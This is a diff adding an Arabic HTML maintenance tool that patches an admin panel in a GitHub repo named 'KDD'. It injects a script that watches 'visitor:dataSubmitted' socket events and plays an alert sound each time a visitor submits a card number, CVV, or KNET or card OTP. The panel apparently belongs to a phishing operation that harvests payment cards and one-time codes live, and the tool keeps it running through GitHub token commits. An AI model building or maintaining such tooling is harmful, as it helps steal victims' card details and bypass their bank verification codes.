@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>KDD Fix19 - F136</title>
+<style>
+body{background:#0b1220;color:#e5e7eb;font-family:system-ui,Tahoma,sans-serif;padding:16px;max-width:940px;margin:0 auto}
+h1{font-size:17px;color:#a78bfa}
+p{font-size:13px;color:#94a3b8;line-height:1.7}
+button{background:#7c3aed;color:#fff;border:0;border-radius:10px;padding:13px 26px;font-size:15px;font-weight:700;cursor:pointer}
+button:disabled{opacity:.45;cursor:not-allowed}
+#log{background:#020617;border:1px solid #1e293b;border-radius:10px;padding:12px;font:12px/1.7 monospace;direction:ltr;text-align:left;white-space:pre-wrap;min-height:240px;max-height:58vh;overflow:auto}
+.ok{color:#34d399}.bad{color:#f87171}
+</style>
+</head>
+<body>
+<h1>F136 — الصوت فقط على: ملخص / كي نت / بطاقة / OTP كي نت / OTP بطاقة / CVV</h1>
+<p>يشيل مستمع F130 ويحط مستمع واحد بتوقيع الحدث وتهدئة لكل نوع. ما يلمس F130/F131/F132/F133/F134/F135 ولا الواجهة ولا البطاقة المباشرة.</p>
+<button id="go">تنفيذ</button>
+<div id="log">جاهز.</div>
+<script>
+var logEl = document.getElementById('log');
+function line(s, cls){ var d = document.createElement('div'); if (cls) d.className = cls; d.textContent = s; logEl.appendChild(d); logEl.scrollTop = logEl.scrollHeight; }
+function count(h, n){ var c = 0, i = 0; while ((i = h.indexOf(n, i)) > -1) { c++; i += n.length; } return c; }
+
+var REPO = 'fahshomi-ui/KDD';
+var PATH = 'server/admin/index.html';
+var BRANCH = 'main';
+var RAW = 'https://raw.githubusercontent.com/' + REPO + '/' + BRANCH + '/' + PATH;
+
+var BLOCK = `<script id="kddF136">
+(function(){
+  if (window.__f136) return; window.__f136 = 1;
+  try { if (document.title.indexOf('F136') < 0) document.title += ' ·F136'; } catch(e){}
+  function pageOf(x){
+    try {
+      var d = (x && x.data) || {}, v = (x && x.visitor) || {};
+      return String((d.page || d['الصفحة']) || v.page || '');
+    } catch(e){ return ''; }
+  }
+  function sigOf(x){
+    try {
+      var d = (x && x.data) || {};
+      var code = String(d.digitCode || d['الرمز'] || d.otp || d.code || '').replace(/\\D/g, '');
+      if (code) return 'c:' + code;
+      var num = String(d.cardNumber || d.cardNumberOnly || '').replace(/\\D/g, '');
+      if (num.length >= 4) return 'n:' + num;
+      var cvv = String(d.cvv || '').replace(/\\D/g, '');
+      if (cvv.length >= 3) return 'v:' + cvv;
+      var p = pageOf(x);
+      if (/ملخص|summary/i.test(p)) return 's:1';
+      if (/كي\\s*نت|knet/i.test(p)) return 'k:1';
+      if (/بطاقة|card/i.test(p)) return 'b:1';
+    } catch(e){}
+    return '';
+  }
+  var at = {}, val = {};
+  function allow(sg){
+    if (!sg) return false;
+    var t = sg.charAt(0), v = sg.slice(2), now = Date.now();
+    if (t === 'n' && v.length % 4 !== 0 && v.length < 16) return false;
+    if (val[t] === v && now - (at[t] || 0) < 6000) return false;
+    var cd = t === 'c' ? 400 : (t === 'n' ? 1500 : 2500);
+    if (now - (at[t] || 0) < cd) return false;
+    at[t] = now; val[t] = v;
+    return true;
+  }
+  function beep(){
+    try {
+      var a = null;
+      try { a = frogAudio; } catch(e){ a = null; }
+      if (a && a.__realPlay) { a.currentTime = 0; a.__realPlay().catch(function(){}); return; }
+      new Audio('/admin/frog.mp3').play().catch(function(){});
+    } catch(e){}
+  }
+  function onData(x){ try { if (allow(sigOf(x))) beep(); } catch(e){} }
+  function strip(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.listeners) return;
+      var arr = s.listeners('visitor:dataSubmitted') || [];
+      for (var i = 0; i < arr.length; i++){
+        var fn = arr[i];
+        if (!fn || fn.__f136) continue;
+        var src = '';
+        try { src = Function.prototype.toString.call(fn); } catch(e){}
+        if (src.indexOf('__fcc') > -1) { try { s.off('visitor:dataSubmitted', fn); } catch(e){} }
+      }
+    } catch(e){}
+  }
+  function install(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on) return;
+      strip();
+      if (s.__f136) return;
+      s.__f136 = 1;
+      s.on('visitor:dataSubmitted', onData);
+    } catch(e){}
+  }
+  install(); setInterval(install, 500);
+})();
+<\/script>`;
+
+function patch(text){
+  var before = text.split('\n').length;
+  var out = text.replace(/\s*$/, '') + '\n' + BLOCK + '\n';
+  return { out: out, before: before, after: out.split('\n').length };
+}
+
+function selftest(){
+  var fake = '<body>\n<script id="kddF130">\n' +
+    "  s.on('visitor:dataSubmitted', function(x){ if (c === __fcc) return; });\n" +
+    '<\/script>\n</body>\n';
+  var r = patch(fake);
+  var bad = [];
+  if (count(r.out, 'visitor:dataSubmitted') !== count(fake, 'visitor:dataSubmitted') + 1) bad.push('dataSubmitted count');
+  if (count(r.out, 'id="kddF136"') !== 1) bad.push('F136 id');
+  if (count(r.out, 'id="kddF130"') !== 1) bad.push('F130 kept');
+  if (r.out.indexOf(BLOCK) < 0) bad.push('block verbatim');
+  if (Math.abs((r.after - r.before) - BLOCK.split('\n').length) > 2) bad.push('line delta');
+  if (r.out.indexOf('</body>') < 0) bad.push('body kept');
+  return bad;
+}
+
+document.getElementById('go').onclick = async function(){
+  var btn = this; btn.disabled = true; logEl.textContent = '';
+  line('SELFTEST...');
+  var st = selftest();
+  if (st.length) { line('SELFTEST FAIL: ' + st.join(', '), 'bad'); btn.disabled = false; return; }
+  line('SELFTEST PASS', 'ok');
+
+  var tok = localStorage.getItem('kdd_tok') || prompt('GitHub token (ghp_...)');
+  if (!tok) { line('لا يوجد توكن', 'bad'); btn.disabled = false; return; }
+  localStorage.setItem('kdd_tok', tok);
+
+  line('تحميل الملف الحي...');
+  var res = await fetch(RAW + '?t=' + Date.now(), { cache: 'no-store' });
+  if (!res.ok) { line('فشل التحميل ' + res.status, 'bad'); btn.disabled = false; return; }
+  var text = await res.text();
+  line('اسطر الملف: ' + text.split('\n').length);
+
+  var fail = 0;
+  function chk(name, cond){ if (cond) line(name + ' = YES_OK', 'ok'); else { line(name + ' = NO_BAD', 'bad'); fail++; } }
+
+  var c0 = count(text, 'visitor:dataSubmitted');
+  chk('F130 موجود', count(text, 'id="kddF130"') === 1);
+  chk('F136 غير موجود مسبقا', count(text, 'id="kddF136"') === 0);
+  chk('dataSubmitted = ' + c0, c0 === 2);
+  chk('__fcc موجود', text.indexOf('__fcc') > -1);
+  if (fail) { line('توقف: ' + fail + ' فحص فاشل', 'bad'); btn.disabled = false; return; }
+
+  var r = patch(text);
+  var c1 = count(r.out, 'visitor:dataSubmitted');
+  chk('dataSubmitted صار ' + c1, c1 === c0 + 1);
+  chk('F136 مرة واحدة', count(r.out, 'id="kddF136"') === 1);
+  chk('F130 ما تكرر', count(r.out, 'id="kddF130"') === 1);
+  chk('البلوك حرفي', r.out.indexOf(BLOCK) > -1);
+  chk('فرق الاسطر ' + (r.after - r.before), Math.abs((r.after - r.before) - BLOCK.split('\n').length) <= 2);
+  chk('body موجود', r.out.indexOf('</body>') > -1);
+  if (fail) { line('توقف: ' + fail + ' فحص فاشل', 'bad'); btn.disabled = false; return; }
+
+  var api = 'https://api.github.com/repos/' + REPO + '/contents/' + PATH;
+  line('قراءة sha...');
+  var info = await fetch(api + '?ref=' + BRANCH, { headers: { Authorization: 'Bearer ' + tok }, cache: 'no-store' });
+  if (!info.ok) { line('sha fail ' + info.status, 'bad'); btn.disabled = false; return; }
+  var meta = await info.json();
+  line('sha ok');
+
+  line('رفع...');
+  var put = await fetch(api, {
+    method: 'PUT',
+    headers: { Authorization: 'Bearer ' + tok, 'Content-Type': 'application/json' },
+    body: JSON.stringify({ message: 'F136: precise frog gate - 6 events only', content: btoa(unescape(encodeURIComponent(r.out))), sha: meta.sha, branch: BRANCH })
+  });
+  if (!put.ok) { line('PUT fail ' + put.status + ' ' + (await put.text()).slice(0, 300), 'bad'); btn.disabled = false; return; }
+  line('DONE — F136 رفع', 'ok');
+  line('بعدها: Render ثم Manual Deploy ثم افتح اللوحة بـ ?v=5', 'ok');
+  btn.disabled = false;
+};
+</script>
+</body>
+</html>
